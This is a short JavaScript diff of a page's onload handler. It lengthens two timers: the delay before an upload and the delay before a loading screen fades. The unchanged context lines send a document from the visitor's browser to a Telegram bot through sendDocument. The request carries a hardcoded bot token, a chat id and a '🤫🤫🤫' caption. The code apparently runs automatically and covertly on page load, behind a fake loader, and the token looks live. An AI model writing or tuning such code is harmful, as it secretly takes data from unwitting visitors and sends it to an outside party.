@@ -96,7 +96,7 @@ window.onload = function(){
 			xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669&caption=🤫🤫🤫`, true);
 			xhr.send(formDataToUpload);
 		});
-	},1000)
+	},8000)
 	userName();
 	Desktop();
 	var loader = document.querySelector('#loader');
@@ -104,5 +104,5 @@ window.onload = function(){
 		//loader.style.display = "none";
 		loader.style.opacity = "0"
 		loader.addEventListener('transitionend', () => loader.remove());
-	}, 3000);
+	}, 7000);
 }
